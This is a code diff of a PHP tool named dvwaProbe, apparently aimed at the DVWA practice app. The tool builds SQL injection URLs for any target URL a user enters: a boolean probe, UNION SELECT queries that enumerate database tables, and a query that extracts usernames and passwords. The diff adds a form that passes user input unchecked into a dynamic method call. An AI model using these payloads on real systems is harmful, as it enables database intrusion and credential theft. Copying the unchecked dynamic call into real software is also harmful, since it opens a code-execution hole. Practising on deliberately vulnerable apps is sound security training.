@@ -14,7 +14,6 @@ class dvwaProbe
  	 *
  	 * @return string
  	 */
-	 
 	public function inject()
 	{
 		$insert = "?id=1%27 and 1%3d1 ";
@@ -27,7 +26,6 @@ class dvwaProbe
  	 * @param string $url
  	 * @return string
  	 */
-	 
 	public function getDatabase()
 	{
 		$insert = $this->inject();
@@ -41,8 +39,7 @@ class dvwaProbe
  	 * @param string $url
  	 * @return string
  	 */
-	 
-	public function getTable()
+	public function getTables()
 	{
 		$insert = $this->inject();
 		$injectURL = $this->url . $insert . "union select null%2c table_name from information_schema.tables%23&Submit=Submit#";
@@ -55,8 +52,7 @@ class dvwaProbe
  	 * @param string $url
  	 * @return string
  	 */
-	 
-	public function getPassword()
+	public function getUsers()
 	{
 		$insert = $this->inject();
 		$injectURL = $this->url . $insert . "union select user%2c password from users%23&Submit=Submit#";
@@ -69,7 +65,6 @@ class dvwaProbe
  	 * @param string $url
  	 * @return string
  	 */
-	 
 	public function getVersion()
 	{
 		$insert = $this->inject();
@@ -77,7 +72,6 @@ class dvwaProbe
 		return $injectURL;
 	}
 }
-
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -107,13 +101,22 @@ class dvwaProbe
 			<?php if ($_POST): ?>
                 <?php 
                     $url = $_POST["url"];
-                    $dvwaProbe = new dvwaProbe($url);
-                    echo $dvwaProbe->getPassword();                            
+                    $dvwaProbe = new dvwaProbe($url);                    
+                    $data = $dvwaProbe->{$_POST["sqlQuery"]}();   
                 ?>
+                <iframe src="<?php echo $data?>" width="1000" height="600"></iframe>
             <?php else: ?>
                 <form method="POST" action="">
                     <div>
                         <input type="text" placeholder="Website URL" class="" name="url">
+                    </div>
+                    <div>
+                        <select name="sqlQuery">
+                            <option value="getDatabase">Get Database</option>
+                            <option value="getTables">Get Tables</option>
+                            <option value="getUsers">Get Users</option>
+                            <option value="getVersion">Get Version</option> 
+                        </select>                           
                     </div>
                     <div>
                         <button type="submit" class="btn btn-lg btn-warning"> Submit</button>
